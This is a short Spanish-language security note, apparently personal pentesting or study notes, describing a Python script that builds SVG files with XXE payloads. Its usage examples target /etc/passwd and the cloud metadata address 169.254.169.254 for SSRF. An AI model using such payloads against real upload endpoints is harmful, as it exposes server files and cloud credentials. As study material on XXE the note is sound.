---
aliases:
  - XXE scripts
tags:
  - vuln/xxe
  - scripts
---

# XXE — Scripts generadores de payloads

Scripts en **Python** (sin dependencias externas) para armar payloads XXE con parámetros míos, en vez de tener archivos estáticos.

| Script | Qué genera | Uso rápido |
| --- | --- | --- |
| `gen_svg_xxe.py` | Un **SVG con payload XXE** (recurso a leer parametrizable) | `python gen_svg_xxe.py -r file:///etc/passwd -o passwd.svg` |

## `gen_svg_xxe.py`
Arma el SVG del ejemplo [[vulnerabilities/006-xxe/examples/004-xxe-por-subida-de-svg|004 — subida de SVG]] pero con el recurso como parámetro.

```bash
python gen_svg_xxe.py                              # file:///etc/hostname -> xxe.svg
python gen_svg_xxe.py -r file:///etc/passwd -o passwd.svg
python gen_svg_xxe.py -r http://169.254.169.254/  # XXE -> SSRF (metadata)
python gen_svg_xxe.py --stdout                     # imprime, no guarda
```

Flags: `-r/--resource` (URI), `-o/--output`, `-e/--entity`, `--width/--height`, `--stdout`.
